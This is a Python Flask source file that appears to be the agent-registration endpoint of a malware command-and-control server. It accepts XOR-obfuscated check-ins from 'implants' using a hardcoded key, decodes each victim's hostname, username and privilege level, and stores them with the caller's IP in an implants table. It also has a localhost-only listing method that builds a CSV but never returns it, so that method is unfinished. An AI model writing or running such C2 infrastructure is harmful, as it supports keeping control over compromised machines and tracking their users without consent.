#TODO
import os
from random import choice
from string import ascii_lowercase

import flask
from flask import request
from flask_restful import Resource
from database.dbconnection import get_db_connection

class agents(Resource):

    def get(self):

        try:
            if request.remote_addr != '127.0.0.1':
                return {"Error": "Access denied"}, 403

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT implant_hostname,implant_username,ip_address FROM implants")
            rows = cursor.fetchall()

            csv_string = ""

            if rows:
                for row in rows:
                    csv_string += ",".join(map(str, row)) + "\n"

            conn.close()





        except Exception as e:
            return {"Error": str(e)}, 500


    def post(self):

        try:
            encrypted_data = request.get_data()
            
            key_str = "1234"
            key = [ord(char) for char in key_str]
            decrypted_data = ''.join(chr(byte ^ key[i % len(key)]) for i, byte in enumerate(encrypted_data))
            print(decrypted_data)
            
            data = decrypted_data.split(',,')
            hostname = data[0]
            print(hostname)
            username = data[1]
            print(username)
            privilege = data[2]
            print(privilege)
            ipaddress = request.remote_addr
            print(ipaddress)

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO implants (implant_hostname, implant_username, ip_address) VALUES (?, ?, ?)", (hostname, username, ipaddress))
            conn.commit()
            implant_id = cursor.lastrowid
            conn.close()
            return implant_id, 201

        except Exception as e:
            return {"Error": str(e)}, 500